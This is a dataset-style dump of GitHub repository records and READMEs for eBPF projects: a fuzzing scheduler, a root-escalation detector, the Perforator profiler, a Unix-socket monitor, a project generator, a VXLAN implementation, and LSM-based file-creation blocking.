./scheduler.sh --help
Usage: scheduler.sh [-dhV] [--java] [--log] [-e=<errorCommand>]
                    [--error-check-interval=<errorCheckIntervalNs>]
                    [-i=<iterationTimeNs>] [-m=<maxIterations>] [-r=<runRange>]
                    [-s=<sleepRange>] [--slice=<sliceNs>]
                    [--system-slice=<systemSliceNs>] script
Linux scheduler that produces random scheduling edge case to fuzz concurrent
applications, runs till error
      script                 Script or command to execute
  -d, --dont-scale-slice     Don't scale the slice time with the number of
                               waiting tasks
  -e, --error-command=<errorCommand>
                             Command to execute on error, default checks for
                               error code != 0
      --error-check-interval=<errorCheckIntervalNs>
                             Time between two checks via the error script
  -h, --help                 Show this help message and exit.
  -i, --iteration-time=<iterationTimeNs>
                             Time to run the script for at a time, restart the
                               whole process afterwards
      --java                 Focus on Java application threads
      --log                  Log the state changes
  -m, --max-iterations=<maxIterations>
                             Maximum number of iterations
  -r, --run=<runRange>       Range of running time lengths
  -s, --sleep=<sleepRange>   Range of sleep lengths
      --slice=<sliceNs>      Time slice duration for the script
      --system-slice=<systemSliceNs>
                             Time slice duration for all non-script tasks
  -V, --version              Print version information and exit.
```

## Example

The sample Java program [samples/Queue.java](samples/Queue.java) is a tiny producer-consumer example:

![Visualization of the Queue.java program](img/queue_sample.png)

The producer produces an item every 20ms and puts it in the queue from which the consumer takes a new item every 10ms.
The consumer crashes the program whenever an item is older than 1s. This is modelled after a real-world issue
I had while developing a profiler for OpenJDK.

You can run the program directly and it shouldn't crash:

```sh
# Compile the program
samples/build_queue.sh
# Run the program
samples/run_queue.sh
```

Even using [stress-ng](https://github.com/ColinIanKing/stress-ng) it shouldn't crash.

But we can run it with the custom fuzz scheduler and create an erratic scheduling behavior that leads to a crash, e.g.:

```sh
> ./scheduler.sh samples/run_queue.sh --log --java
Iteration
[4.293] java is sleeping for 586ms
[4.886] java is running for 5ms
[4.886] java is sleeping for 2241ms
[7.132] java is running for 10ms
[7.144] java is sleeping for 299ms
[7.445] java is running for 3ms
[7.449] java is sleeping for 1038ms
[8.606] java is running for 6ms
[8.611] java is sleeping for 827ms
[9.435] java is running for 10ms
[9.446] java is sleeping for 1543ms
[10.990] java is running for 16ms
[11.012] java is sleeping for 754ms
[11.767] java is running for 15ms
[11.792] Producer is sleeping for 299ms
[12.092] Producer is running for 14ms
[12.111] Producer is sleeping for 1605ms
[13.719] Producer is running for 5ms
[13.731] Consumer is sleeping for 301ms
[14.034] Consumer is running for 12ms
[14.054] Producer is sleeping for 1783ms
[15.839] Producer is running for 15ms
[15.860] Producer is sleeping for 285ms
[16.146] Producer is running for 5ms
[16.156] Consumer is sleeping for 968ms
# ...
[22.494] Producer is running for 11ms
[22.514] Producer is sleeping for 1815ms
[24.330] Producer is running for 16ms
[24.358] Producer is sleeping for 1174ms
[25.528] Producer is running for 7ms
[25.538] Consumer is sleeping for 1912ms
[27.456] Consumer is running for 3ms
[27.465] Consumer is sleeping for 1177ms
[28.655] Consumer is running for 15ms
[28.662] Consumer is sleeping for 1525ms
[30.187] Consumer is running for 6ms
[30.195] Consumer is sleeping for 475ms
[30.674] Consumer is running for 12ms
Program failed after 30.774
```

## Install

Install a 6.12 (or later) kernel, on Ubuntu use [mainline](https://github.com/bkw777/mainline) if you're on Ubuntu 24.10 or older.

You should also have installed:

- `libbpf-dev`
- clang
- Java 23

Now you just have to build the sound-of-scheduling via:

```sh
mvn package
```

You can speed it up with `mvnd`.

License
=======
GPLv2
"
containerscrew/rootisnaked,33,4,33,0,C,Simple root privilege escalation detection using eBPF ðŸ,2025-01-30T17:21:32Z,2025-10-05T06:17:15Z,59,"<p align=""center"" >
<h3 align=""center"">rootisnaked</h3>
<p align=""center"">Simple root privilege escalation detection using eBPF</p>
</p>

<p align=""center"" >
    <img alt=""GitHub code size in bytes"" src=""https://img.shields.io/github/languages/code-size/containerscrew/rootisnaked"">
    <img alt=""GitHub last commit"" src=""https://img.shields.io/github/last-commit/containerscrew/rootisnaked"">
    <img alt=""GitHub issues"" src=""https://img.shields.io/github/issues/containerscrew/rootisnaked"">
    <img alt=""GitHub pull requests"" src=""https://img.shields.io/github/issues-pr/containerscrew/rootisnaked"">
    <img alt=""GitHub Repo stars"" src=""https://img.shields.io/github/stars/containerscrew/rootisnaked?style=social"">
    <img alt=""GitHub watchers"" src=""https://img.shields.io/github/watchers/containerscrew/rootisnaked?style=social"">
    <img alt=""License"" src=""https://img.shields.io/badge/License-MIT-blue.svg"">
    <img alt=""License"" src=""https://img.shields.io/badge/License-GPLv3-blue.svg"">
</p>

---

> Rootisnaked was initially created using [ebpf-go](github.com/cilium/ebpf). The project actually uses [libbpf](https://github.com/libbpf/libbpf) (kernel and user space code written entirely in C). You can find the initial version [here](https://github.com/containerscrew/rootisnaked/tree/rootisnaked-go). There is no reason to use C instead of Go in the user space, it's a personal preference to practice C and libbpf.

# rootisnaked

`Rootisnaked` is a simple [eBPF](https://ebpf.io/) program designed to monitor changes in user credentials (specifically, the UID) on a Linux system. It hooks into the `commit_creds` kernel function, which is called when a process's credentials are updated. The program detects when a process's UID changes to 0 (root) and logs this event to a ring buffer for further analysis in user space.
It can be used, for example, to detect possible Linux privilege escalation.

> [!CAUTION]
> This is an introduction of eBPF. This tool DOES NOT cover all possible attack vectors for escalating privileges.

---

![example](example.png)

```markdown
2025-09-24 11:06:30 [INFO]: Starting rootisnaked
2025-09-24 11:06:30 [INFO]: eBPF program loaded and attached. Waiting for commit_creds_events...
2025-09-24 11:06:33 [INFO]: event=file_perm, pid=35890, user=root, uid=0, comm=chmod, mode=777, filename=/etc/test, hostname=arch
2025-09-24 11:06:41 [INFO]: event=commit_creds, user=dcr, tgid=36064, old_uid=1000, new_uid=0, cmdline=sudo su - , executable_path=/usr/bin/sudo, hostname=arch
```

<h2 align=""center"">Alerting using alertmanager and telegram</h2>
<p align=""center"">
  <img src=""telegram_alert.png"" alt=""logo"" width=""400""/>
</p>


# Running `rootisnaked`

## Install system dependencies (Ubuntu)

```bash
sudo apt install -y linux-headers-$(uname -r) vim gcc make clang libbpf-dev curl clang-format libcurl4-openssl-dev build-essential libelf-dev
```

> Tested on `Arch Linux` with kernel version `6.16.5-arch1-1` and `Ubuntu 24.04` with kernel version `6.2.0-26-generic`.

## Optional: Setup alertmanager for centralized alerting (via telegram)

```bash
cp docker/.env.example docker/.env
# Edit docker/.env and set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
set -a; source docker/.env; set +a
envsubst < docker/alertmanager/alertmanager.yml.tpl > docker/alertmanager/alertmanager.yml
docker-compose -f docker/compose.yml up -d
```

## Compile and run

```bash
make # Using all available threads
# Or with only 1 thread
# make -j1
# make -j4 # Using 4 threads
DEBUG=false ALERTS=true sudo -E ./bin/rootisnaked
# Or alerts disabled
DEBUG=false ALERTS=false sudo -E ./bin/rootisnaked
```

> The url of alertmanager is harcoded to http://localhost:9093 by the moment.

## Using docker

```bash
sudo docker build -f docker/Dockerfile -t containerscrew/rootisnaked:latest .
```

> **eBPF code needs to be run under a privileged user or giving capabilities and mounting some required filesystems (proc,sys...)**

```bash
sudo podman run -itd --restart always --name rootisnaked --privileged \
  -v /proc:/proc:ro \
  -v /sys:/sys:ro \
  -e DEBUG=false \
  -e ALERTS=false \
  containerscrew/rootisnaked:latest
```

> Using `sudo` because I use podman rootless

## Using the script `scripts/install.sh` and systemd service

By the moment I didnÂ´t create any package (deb, rpm...) so I created a simple script to install and setup a systemd service to run `rootisnaked` on boot.

```bash
./scripts/install.sh
```

> This script will create a systemd service to run `rootisnaked` (`systemctl status rootisnaked`)

# License

**`rootisnaked`** is distributed under the terms of the [GPL3](./LICENSE-GPL3) and [MIT](./LICENSE-MIT) license.
"
yandex/perforator,3263,146,3263,26,C++,Perforator is a cluster-wide continuous profiling tool designed for large data centers,2025-01-29T14:20:43Z,2025-10-12T14:43:02Z,2108,"<img width=""64"" src=""docs/_assets/logo.svg"" /><br/>

[![License](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](https://github.com/yandex/perforator/blob/main/LICENSE)
[![eBPF code license](https://img.shields.io/badge/eBPF_code_License-GPLv2-blue.svg)](https://github.com/yandex/perforator/tree/main/perforator/agent/collector/progs/unwinder/LICENSE)
[![Telegram](https://img.shields.io/badge/Telegram-ru-2ba2d9.svg)](https://t.me/perforator_ru)
[![Telegram](https://img.shields.io/badge/Telegram-en-2ba2d9.svg)](https://t.me/perforator_en)

# Perforator

[Documentation](https://perforator.tech/docs/) | [Post on Medium](https://medium.com/yandex/yandexs-high-performance-profiler-is-now-open-source-95e291df9d18) | [Post on Habr](https://habr.com/ru/companies/yandex/articles/875070)

Perforator is a production-ready, open-source Continuous Profiling app that can collect CPU profiles from your production without affecting its performance, made by Yandex and inspired by [Google-Wide Profiling](https://research.google/pubs/google-wide-profiling-a-continuous-profiling-infrastructure-for-data-centers/). Perforator is deployed on tens of thousands of servers in Yandex and already has helped many developers to fix performance issues in their services.

## Main features
- Efficient and high-quality collection of kernel + userspace stacks via eBPF.
- Scalable storage for storing profiles and binaries.
- Support of unwinding without frame pointers and debug symbols on host.
- Convenient query language and UI to inspect CPU usage of applications via flamegraphs.
- Support for C++, C, Go, and Rust, with experimental support for Java and Python.
- Generation of sPGO profiles for building applications with Profile Guided Optimization (PGO) via [AutoFDO](https://github.com/google/autofdo).

## Minimal system requirements

Perforator runs on x86 64-bit Linux platforms consuming 512Mb of RAM (more on very large hosts with many CPUs) and <1% of host CPUs.

## Quick start

You can profile your laptop using local [perforator record CLI command](https://perforator.tech/docs/en/tutorials/native-profiling).

You can also deploy Perforator on playground/production Kubernetes cluster using our [Helm chart](https://perforator.tech/docs/en/tutorials/kubernetes/helm-chart).

## How to build

- Instructions on how to build from source are located [here](https://perforator.tech/docs/en/guides/build).

- If you want to use prebuilt binaries, you can find them [here](https://github.com/yandex/perforator/releases).

## How to Contribute

We are welcome to contributions! The [contributor's guide](CONTRIBUTING.md) provides more details on how to get started as a contributor.

## License

This project is licensed under the Apache 2.0 License (Apache-2.0). [Apache 2.0 License](https://github.com/yandex/perforator/tree/main/LICENSE)

NB: Formerly, we licensed Perforator under MIT license. We switched to Apache 2.0 to waive custom CLA signature requirements and simplify contributions.

The eBPF source code is licensed under the GPL 2.0 license. [GPL 2.0](https://github.com/yandex/perforator/tree/main/perforator/agent/collector/progs/unwinder/LICENSE)
"
altugbozkurt07/Unix-sniffer,11,2,11,0,Rust,Simple cli tool to monitor unix socket traffic including ancillary data,2025-01-27T17:02:27Z,2025-02-25T18:14:20Z,4,"# unix-sniffer

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E"" -- (scm-creds|scm-fds|unix-socket)'
```

There are 3 available mods you can choose: `unix-socket`, `scm-fds`, and `scm_creds`.

`unix-socket` : when enabled, allows you to listen to unix socket traffic specified in systemwatchers.
![unix socket sniffer](image-1.png)
`scm-fds` : allows you to monitor file descriptors passed through unix sockets.
![fds passed over unix socket](image.png)
`scm-creds` : allows you to monitor scm_credentials event used as an authentication mechanism between different processes.
![scm_credential events](image-2.png)

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package unix-sniffer --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/unix-sniffer` can be
copied to a Linux server or VM and run there.
"
dorkamotorka/goby,33,2,33,2,C,Goby CLI eBPF Project Generator,2025-01-28T22:08:08Z,2025-10-11T12:55:56Z,19,"
# Goby

**Goby** (inspired by combining Golang and eBPF in a cartoon fashion) is a CLI tool that helps you generate the initial project setup for developing eBPF programs using the [Cilium eBPF library](https://github.com/cilium/ebpf).

![ebpf-gopher](https://github.com/user-attachments/assets/0f1187d2-361a-414f-b933-28cf2416f657)


## Prerequisites

Before getting started, follow the official Cilium guide to install the required prerequisites: [Getting Started Guide](https://ebpf-go.dev/guides/getting-started/#ebpf-c-program).

Additionally, you'll need to install [bpftool](https://github.com/libbpf/bpftool).

## How to Use Goby

1. **Install Goby** from the latest release:

   ```bash
   curl -L -o goby https://github.com/dorkamotorka/goby/releases/download/main/goby
   chmod +x goby
   sudo mv goby /usr/local/bin/
   ```

2. **Initialize your eBPF project** by running the following command from the root of your project:

   ```bash
   goby init <path>
   ```

   Replace `<path>` with the directory where you want to create your eBPF project.

   **Note**: If the directory doesn't exist, Goby will create it for you.

## What Does Goby Do?

Goby generates a set of files to speed up the initial setup of your eBPF project. The current version focuses on simplicity to get you quickly up and running with your idea. Specifically, it generates the following files:

- `program.bpf.c`: The file where you write your eBPF kernel code.
- `main.go`: The Golang program that loads and attaches eBPF programs.
- `vmlinux.h`: A header file generated using `bpftool`, which is used inside the eBPF kernel program to interact with various kernel structs.
- `Makefile`: A wrapper around Go commands to initialize, generate, build, and run the eBPF program.

## Inside Your eBPF Golang Project

Check the corresponding files for helpful comments.

1. **Initialize your Golang project** using:

   ```bash
   make init
   ```

2. **Generate the eBPF skeleton, build the binary, and run it** using:

   ```bash
   make run
   ```

## Development Tips

Check out the `example_project`, which was initialized using Goby and includes an eBPF tracepoint example.

### eBPF Kernel Program (`program.bpf.c`)

In the eBPF kernel program, you'll mostly write eBPF subprograms that attach to various hooks, such as LSM hooks, XDP, or tracing points.

When designing your eBPF program, refer to the [eBPF documentation](https://docs.ebpf.io/ebpf-library/libbpf/), which includes useful helper functions and header files for various eBPF hooks.

### eBPF User Space Program (`main.go`)

The user-space program is responsible for loading and attaching your eBPF kernel program.

Ciliumâ€™s [eBPF library documentation](https://pkg.go.dev/github.com/cilium/ebpf) provides useful guidance on how to achieve this.

**Note**: Be sure to explore my other repositories for different use cases.

---

With Goby, getting started with eBPF is simple and fast. Happy coding!
"
unikzforce/wormhole,21,5,21,3,C,vxlan protocol / unknown unicast flooding technique + eBPF,2024-02-04T17:16:00Z,2025-09-05T22:16:49Z,167,"# Wormhole Project

This project tends be a simple implementation of the **VXLAN** protocol with __unknown unicast flooding__ technique using **eBPF XDP/TC**.
Please note that I am not a network engineer, and some of my assumptions about the VXLAN protocol may be incorrect. This project is not intended to be fully compliant with the VXLAN protocol; rather, it aims to create a proof of concept for an eBPF-based VXLAN VTEP and demonstrate how VXLAN & its' building blocks can be implemented using eBPF.

using eBPF we can bypass linux kernel networking stack, so it will consume less cpu cycles + it's faster.

## Technologies Used
- Golang/C
- Cilium eBPF
- bpf2go
- Containerlab + go testing + Ginkgo library
- Edge Shark
- Devcontainer + docker-in-docker


## Devoplment Prerequisites
The project has devcontainer nature, so for development, one only needs:

- Linux kernel 6.5 or newer
- Docker
- VSCode ( or any IDE with devcontainer support )


Just open up the project using vscode, and because project has a devcontainer nature (it has `.devcontainer` folder), vscode would automatically suggest you to re-open the project in a development container, proceed with that.

## e2e tests

to verify that this vxlan implementation is working correctly, we have some e2e tests. I have used `containerlab` to create a throwable testing environment.

[containerlab](https://containerlab.dev/) is kinda similar to `testcontainers` but it is more focused on networking and it has better networking abstractions, like network cables and network interfaces.

We have a topology in which there are 2 nodes, `src` and `dst` which are in the same subnet, but they are not connected to each other. in order to connect them we need to activate our **vxlan_agent VTEP** program on both border1 & border2 and check if `src` and `dst` are able to see each other or not.

the scenarios that i'm currently testing in my automated test:

1. if the VTEP software is not active in `border1` and `border2` then
    - `src` and `dst` **SHOULD NOT** be able to ping each other
2. if the VTEP software is enabled both in `border1` and `border2` then
    - `src` and `dst` **SHOULD** be able to ping each other

in the future I'll add some other scenarios to my e2e tests.


![Alt text](./readme/vxlan_e2e_test.drawio.svg)

the e2e tests for vxlan are written in `./test/vxlan_agent/vxlan_agent_test.go`.<br>
the network topology used for this test is defined in `./test/vxlan_agent/vxlan_agent/clab_topologies/vxlan.clab.yml`.


to run the tests, after opening up the project in a ***devcontainer***:

1. Build the necessary images:
    ```sh
    ./scripts/build_images.sh
    ```
2. Run the tests:
    ```sh
    ./script/vxlan_agent_run_tests.sh
    ```


## Interactively testing the program via containerlab

other than performing the e2e tests, there is also another option to test the program and it's by interactively up and runing a containerlab testing lab & checking if the vxlan_agent VTEP program is actually working or not.

This topology is similar to this picture (which is used by the e2e test):

![Alt text](./readme/vxlan_e2e_test.drawio.svg)

We have a topology in which there are 2 nodes, `src` and `dst` which are in the same subnet, but they are not connected to each other. in order to connect them we need to activate our **vxlan_agent VTEP** program on both border1 & border2 and check if `src` and `dst` are able to see each other or not.

to bring up this topology: (again, please do it inside the ***devcontainer*** by opening project as devcontainer in vscode)

1. Build the necessary images if not done already:
    ```sh
    ./scripts/build_images.sh
    ```
2. move into the topology directory:
    ```
    cd ./test/vxlan_agent/vxlan_agent/clab_topologies/
    ```
3. deploy the topology:
    ```
    clab deploy
    ```

when you do this it will bring up several containers:
- src
- border1
- border2
- dst

```
â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚        Name        â”‚         Kind/Image         â”‚  State  â”‚   IPv4/6 Address  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ clab-vxlan-border1 â”‚ linux                      â”‚ running â”‚ 172.20.20.5       â”‚
â”‚                    â”‚ wormhole/test_agent:latest â”‚         â”‚ 3fff:172:20:20::5 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ clab-vxlan-border2 â”‚ linux                      â”‚ running â”‚ 172.20.20.2       â”‚
â”‚                    â”‚ wormhole/test_agent:latest â”‚         â”‚ 3fff:172:20:20::2 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ clab-vxlan-dst     â”‚ linux                      â”‚ running â”‚ 172.20.20.3       â”‚
â”‚                    â”‚ wormhole/test_agent:latest â”‚         â”‚ 3fff:172:20:20::3 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ clab-vxlan-src     â”‚ linux                      â”‚ running â”‚ 172.20.20.4       â”‚
â”‚                    â”‚ wormhole/test_agent:latest â”‚         â”‚ 3fff:172:20:20::4 â”‚
â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
```

now you need to open up several terminals

1. a terminal in vscode to open **bash** in `border1` container:
    - `docker exec -it clab-vxlan-border1 /bin/bash `
    - then in that terminal execute the `vxlan_agent` in border1 by `/build/vxlan_agent --config /build/vxlan_agent.config.yaml`
2. a terminal in vscode to open **bash** in `border2` container:
    - `docker exec -it clab-vxlan-border2 /bin/bash`
    - then in that terminal execute the `vxlan_agent` in border2 by `/build/vxlan_agent --config /build/vxlan_agent.config.yaml`
3. a terminal in vscode to open **bash** in `src` container:
    - `docker exec -it clab-vxlan-src /bin/bash`
    - then in that terminal execute the `dummy_xdp` in src by `/build/dummy_xdp --interface-name eth1`
4. a terminal in vscode to open **bash** in `dst` container:
    - `docker exec -it clab-vxlan-dst /bin/bash`
    - then in that terminal execute the `dummy_xdp` in dst by `/build/dummy_xdp --interface-name eth1`
5. another terminal in vscode to open **bash** in `src` container:
    - `docker exec -it clab-vxlan-src /bin/bash`
    - then in that terminal **ping 192.168.1.11**
6. another terminal in vscode to open **bash** in `dst` container:
    - `docker exec -it clab-vxlan-dst /bin/bash`
    - then in that terminal **ping 192.168.1.10**

in this case you can see if the **vxlan_agent** is active on border1 and border2, then src & dst can ping each other.

please don't forget to bring down the testing lab by running **`clab destroy --all`**

## Short explanation of VXLAN
In a VXLAN environment, you want several geographically remote networks to form a single (or multiple) integrated network(s). For this purpose, you need special nodes named **VTEP**.

Suppose you have two networks, A & B, which both are `192.168.1.0/24` networks, but they are geographically not in the same place and not integrated. With VXLAN, you can join `A` and `B` into one network. For this purpose, you need two VTEP nodes: one at the border of A and another one at the border of B. The connection between A and B is established through the internet (this is just an example; other scenarios may be in place). In this example, we have a VTEP node named `VTEP_A` at the border of A and another VTEP node named `VTEP_B` at the border of B. VTEP_A has several network interfaces, some of which face toward internal nodes of network A, and others face toward the internet. Similarly, VTEP_B has several network interfaces, some of which face toward internal nodes of network B, and others face toward the internet.


![Alt text](./readme/vxlan.drawio.svg)

let's explain a simple scenario, suppose `HOST_11` **knows** the **mac address** of `HOST_21` and want to send it a **ping** request:

1. the ICMP packet will be sent from `HOST_11` to `VTEP_A/eth-in-1`
2. `VTEP_A` will check within its mac table for `HOST_21`, so it will realize which network interface it should forward the packet to.
3. before forwarding the packet it will encapsulate it within another packet with outer ethernet, outer ip, outer udp & outer vxlan headers
4. then `VTEP_A` will forward the packet through `VTEP_A/eth-ext-1` network interface toward the internet.
5. the packet will reach `VTEP_B/eth-ext-1` and will be handed over to `VTEP_B`
6. `VTEP_B` will look for `HOST_21` mac address within its mac table to find which network interface it should forward the packet to.
7. `VTEP_B` will decapsulate the packet so the outer ethernet, outer ip, outer udp & outer vxlan headers will be removed
8.  `VTEP_B` will forward the original decpasulated packet to the `HOST-21` toward `eth-in-1`


## vxlan building blocks using eBPF

to implement a basic VTEP we need to perform several functionalities:
1. packet `redirection`
2. packet `encapsulation`/`decapsulation`
4. packet `cloning` --> in case we need packet flooding ---> unknown unicast flooding
5. `mac address learning`

all of these functionalities are implemented in codes in `./internal/vxlan_agent/ebpf/c/`:
- **vxlan_xdp_internal.bpf.c**
- **vxlan_tc_internal.bpf.c**
- **vxlan_xdp_external.bpf.c**
- **vxlan_tc_external.bpf.c**


### packet redirection

in below picture a network packet reaches to an `internal` NIC of VTEP_A:

1. a packet reaches an internal network interface `eth-in-1` of `VTEP_A`
2. it will be handed over to the `XDP` program that we have already attached to this NIC
3. in the XDP program, it'll check a global eBPF map named `MAC TABLE`. it'll check if it contains any entry for the destination mac address we're trying to send the packet to. suppose we have an entry in the mac table. suppose the in the entry it has stated `eth-ext-1` as forwarding NIC
4. in my eBPF program it'll perform packet redirection to `eth-ext-1` NIC.
5. packet will be sent out from `eth-ext-1` network interface

![Alt text](./readme/inside-vtep.drawio.svg)

in below picture a network packet reaches to an `external` NIC of VTEP_A:

- it is similar to previous scenario, but in reverse ( external network to internal + packet decapsulation at 4)

![Alt text](./readme/outside-vtep.drawio.svg)


the packet redirection in XDP programs can be done using `bpf_redirect()` helper function

### packet encapsulation/decapsulation
suppose `HOST_11` from network A wants to send a packet to `HOST_21` in network B, this is the path it must go through: 

```
HOST_11 --> VTEP_A --> Internet --> VTEP_B --> HOST_21
```

when the packet wants to get out from VTEP_A toward VTEP_B through the **internet**, it must be **`encapsulated`** within another network packet. in an XDP program you can acheive it using `bpf_xdp_adjust_head()` helper function. it will add some headroom to the start of the packet, so one can add extra headers like outer ethernet, outer ip, outer udp & outer vxlan headers. also the same `bpf_xdp_adjust_head()` can be used to shorten the packet length and strip off the outer headers for the purpose of decapsulation when the packet is received by VTEP_B.


![Alt text](./readme/vxlan_headers.jpg)


### packet cloning

suppose `HOST_11` want to ping `HOST_21` (192.168.1.21), but it doesn't know the mac address of it, in this case the OS (windows/linux/mac/...) of the HOST_11, will first send a broadcast ARP request to the network to ask who owns the 192.168.1.21 ip address, and what is the MAC address of the owner. in this case the VTEP_A or even VTEP_B, may have to clone this broadcast ARP request to multiple network interfaces and forward it through all of them. **in eBPF XDP program, one cannot do packet cloning** and **you can only do packet cloning in eBPF TC programs**, using `bpf_clone_redirect()` function.

### mac address learning
whenever a packet reaches a network interface with an XDP program attached to it, by looking at the source MAC address of the packet or inner packet ( in case the packet is encapsulated ) we can perform mac address learning. this can be done easily in XDP programs attached on each internal or external NIC.


## Packet Life Cycle

In this project, the packet forwarding mechanism is implemented using both XDP and TC layers of eBPF. The process is as follows:

1. **MAC Address Lookup**: When a packet arrives at the VTEP, the system first checks the MAC address table.
    - **Entry Found**: If an entry for the destination MAC address is found in the MAC table, the packet is forwarded immediately using the XDP layer. This ensures low-latency forwarding.
    - **Entry Not Found**: If no entry is found for the destination MAC address, the packet is passed from the XDP layer up to the TC layer.

2. **Unknown Unicast Flooding**: In the TC layer, the system performs unknown unicast flooding. This is necessary because the XDP layer does not support cloning a packet multiple times and redirecting it to multiple destinations. The TC layer handles this by cloning the packet and sending it to all possible destinations. (TODO: I should change the program to do unknow unicast flooding for only broadcast packets, not all uknown mac addresses of all packet types should be flooded)



This approach leverages the strengths of both XDP and TC layers to achieve efficient and scalable packet forwarding.

So the life cycle of a packet is something similar to this:

1. **Originating Node**: The packet originates from an internal host within the network.
2. **Arrival at eBPF VXLAN VTEP**: The packet reaches the VTEP where it is processed by the eBPF XDP/TC program.
3. **MAC Table Lookup**: in XDP program attached to the VTEP we checks the MAC table to determine the appropriate forwarding NIC.
4. **Encapsulation**: The packet is encapsulated with an outer Ethernet header, outer IP header, outer UDP header, and outer VXLAN header.
5. **Transmission**: The encapsulated packet is transmitted over the network to the remote eBPF VXLAN VTEP.
6. **Ingress to Remote eBPF VXLAN VTEP**: The remote eBPF VXLAN VTEP receives the encapsulated packet.
7. **Decapsulation**: The outer headers are removed, and the original packet is extracted.
8. **Destination Node**: The decapsulated packet is forwarded to the destination host within the network.

## Types of ebpf programs needed for our VXLAN VTEP

currently we have 4 types of ebpf programs to implement a VXLAN VTEP:

- Internal XDP program  --> implemented in `vxlan_xdp_internal.bpf.c`
- Internal TC program   --> implemented in `vxlan_tc_internal.bpf.c`
- External XDP program  --> implemented in `vxlan_xdp_external.bpf.c`
- External TC program   --> implemented in `vxlan_tc_external.bpf.c`

as I previously mentioned upon each VTEP there are several NICs and some of these NICs are facing toward internal hosts of network and connected to them and some of those NICs are facing toward internet.

upon each internal NIC we attach an `Internal XDP program` and an `Internal TC program`.
upon each external NIC we attach an `Ext"
zodiacon/TraceConnections,47,0,47,0,C,Simple example for getting started with eBPF for Windows,2025-02-22T21:51:13Z,2025-09-17T06:28:26Z,3,"See blog post at https://scorpiosoftware.net/2025/02/22/introduction-to-ebpf-for-windows/.
"
nomaderr/ebpf-file-blocker,5,2,5,2,C,Block file creation with use of eBPF,2025-02-17T13:02:24Z,2025-07-14T00:20:04Z,3,"# eBPF File Creation Blocker

**eBPF-based security module for blocking file creation in specific directories using Eunomia eBPF Runtime.**  
This program prevents files from being created inside `/etc/test/` using the Linux Security Module (LSM) with eBPF.

## Features
- Blocks file creation inside `/etc/test/`
- Uses eBPF LSM hooks for efficient security enforcement
- Minimal overhead compared to traditional kernel modules
- Compatible with **Eunomia eBPF Runtime**
- Logs blocked attempts using `bpf_printk`

## Installation & Compilation

### Prerequisites
- **Linux Kernel** with eBPF and BTF support (`CONFIG_DEBUG_INFO_BTF=y`)
- **Clang/LLVM** for compiling eBPF programs
